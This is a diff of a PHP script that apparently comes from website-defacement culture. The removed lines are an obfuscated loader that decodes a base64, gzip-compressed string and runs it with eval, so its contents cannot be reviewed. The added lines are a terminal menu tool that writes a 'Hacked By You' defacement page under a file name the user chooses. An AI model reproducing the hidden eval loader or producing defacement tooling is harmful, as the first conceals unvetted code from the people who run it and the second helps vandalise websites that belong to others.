@@ -1,6 +1,38 @@
 <?php
-$c = 'nVJRb5swEH4vUv/DJSYidC6ptKqmSps0Sds0SZu07Y0HMBisYCOxkSTNf99ZAnSbtEn7Yvsc33fnu++O67vXl+776+Zp9/GZfX2l49W83P90Z+N0/G7j+LgZ37/m7f72m8dZ072m7X+03e0+7j66r7uPz/tP6eZl+7z9tHvZfX3evux/p5uXp7M+Z2HOfX3YfNl8fO36Y0v5LOnZ5fF8V88X7u1idvFqUReLFy8WS7v48mK5XNnlF8vl2q6+vLgs7PrLq6XdfPny6m/D9P60rIqH6bYc7I/T8mF6Y88XzGzBvD8tH2a2YN4f5v0hH6a/YOYHZr5g5gfO/MHZ798F';
+$c1 = "\033[1;36m"; 
+$c2 = "\033[1;33m"; 
+$c3 = "\033[0m";
 
-$d = gzinflate(base64_decode($c));
-eval($d);
+$b =  $c1."  e88'Y88     e   e        e Y8b     88P'888'Y88 888 Y8b Y8P \n";
+$b .= " d8888 'Y    d8b d8b      d8b Y8b    P'  888  'Y 888  Y8b Y  \n";
+$b .= "C8888      e Y8b Y8P     d888b Y8b       888     888   Y8b  \n";
+$b .= " Y888  ,d  d8b Y8b Y8b   d888888888bi      888     888  e Y8b  \n";
+$b .= "  '88,d88 d888b Y8b Y8bi d8888888b Y8bi     888     888 d8b Y8b \n".$c3;
+
+function cls() { passthru('clear'); }
+
+while (true) {
+    cls();
+    echo $b . "\n";
+    echo $c2."AUTHOR TOOL | BOIESCYLLOSH\n\n".$c3;
+    echo "1. Create Deface File\n";
+    echo "2. Exit\n\n";
+    echo "Choose > ";
+    
+    $sel = trim(fgets(STDIN));
+    
+    if ($sel == "1") {
+        cls();
+        echo "File Name (ex: deface.php) : ";
+        $fn = trim(fgets(STDIN));
+        if ($fn) {
+            $code = "<?php echo 'Hacked By You'; ?>";
+            file_put_contents($fn, $code);
+            echo "\n\033[1;32m[+] Success! File saved as: $fn\033[0m\n";
+            sleep(2);
+        }
+    } elseif ($sel == "2") {
+        exit("\nBye Bre!\n");
+    }
+}
 ?>
